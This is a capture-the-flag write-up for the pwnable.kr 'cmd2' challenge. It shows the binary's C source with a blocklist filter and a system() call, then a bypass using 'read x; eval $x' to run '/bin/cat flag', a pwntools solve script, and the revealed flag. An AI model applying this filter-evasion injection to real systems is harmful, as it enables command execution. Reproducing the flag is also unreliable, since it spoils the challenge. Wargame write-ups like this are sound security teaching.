# cmd2

## Analysis

```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "=")!=0;
        r += strstr(cmd, "PATH")!=0;
        r += strstr(cmd, "export")!=0;
        r += strstr(cmd, "/")!=0;
        r += strstr(cmd, "`")!=0;
        r += strstr(cmd, "flag")!=0;
        return r;
}

extern char** environ;
void delete_env(){
        char** p;
        for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
        delete_env();
        putenv("PATH=/no_command_execution_until_you_become_a_hacker");
        if(filter(argv[1])) return 0;
        printf("%s\n", argv[1]);
        setregid(getegid(), getegid());
        system( argv[1] );
        return 0;
}
```

Since no PATH lookup, we use builtin shell commands.

## Solution

A simple trick is simulating a shell-like behavior by getting user input and evaluating it.

This is possible through `read` and `eval`.

```sh
❯ nc pwnable.kr 10013
=================================================================================
  [ CMD2 Shell ]
  Daddy bought me a system command shell.
  but he put some filters to prevent me from playing with it without his permission...
  but I wanna play anytime I want!

  ※ You got 500s in /bin/sh. Good luck.
  ※ Available: python3
=================================================================================
./cmd2 'read x; eval $x;'
/bin/cat flag
Shell_variables_can_be_quite_fun_to_play_with!
```

or `solve.py`:

```py
from pwn import *

p = remote('pwnable.kr','10013')

p.sendlineafter(b'CMD2 Shell', b"./cmd2 'read x; eval $x'")
p.sendline(b'/bin/cat flag')

p.interactive()
```
```sh
❯ python3 solve.py
[+] Opening connection to pwnable.kr on port 10013: Done
[*] Switching to interactive mode
 ]                                                               
  Daddy bought me a system command shell.
  but he put some filters to prevent me from playing with it without his permission...
  but I wanna play anytime I want!

  ※ You got 500s in /bin/sh. Good luck.                                      
  ※ Available: python3 
=================================================================================
Shell_variables_can_be_quite_fun_to_play_with!
read x; eval $x
$  
```

Flag: `Shell_variables_can_be_quite_fun_to_play_with!`